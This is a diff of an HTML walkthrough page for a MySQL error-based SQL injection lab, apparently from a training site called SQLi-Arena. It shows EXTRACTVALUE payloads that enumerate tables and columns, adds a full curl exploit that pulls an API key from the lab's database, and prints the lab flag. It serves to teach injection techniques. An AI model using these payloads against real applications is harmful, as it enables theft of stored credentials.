@@ -128,7 +128,7 @@
     </div>
     <div class="terminal-body">
         <span class="prompt">Tables: </span>' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()))) -- -<br>
-        <span class="prompt">Error: </span>XPATH syntax error: '~api_keys,messages'<br><br>
+        <span class="prompt">Error: </span>XPATH syntax error: '~messages,api_keys'<br><br>
         <span class="prompt">Columns: </span>' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='api_keys'))) -- -<br>
         <span class="prompt">Error: </span>XPATH syntax error: '~id,service_name,api_key'
     </div>
@@ -139,6 +139,18 @@
     Copy the flag from the error message and paste it into the verification form:
     <code>FLAG{gt1d_j50n_3rr0r_l34k}</code>.
 </p>
+
+<div class="terminal">
+    <div class="terminal-header">
+        <span class="terminal-dot red"></span>
+        <span class="terminal-dot yellow"></span>
+        <span class="terminal-dot green"></span>
+        <span class="terminal-title">curl. Full Exploit</span>
+    </div>
+    <div class="terminal-body">
+        <span class="prompt">$ </span>curl -s "http://target/SQLi-Arena/mysql/lab8" \<br> --data-urlencode "user=' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT api_key FROM api_keys WHERE service_name='internal'))) -- -"
+    </div>
+</div>
 
 <div class="result-success result-box">
     <strong>Key Takeaway:</strong> MySQL 5.7+ introduced functions like
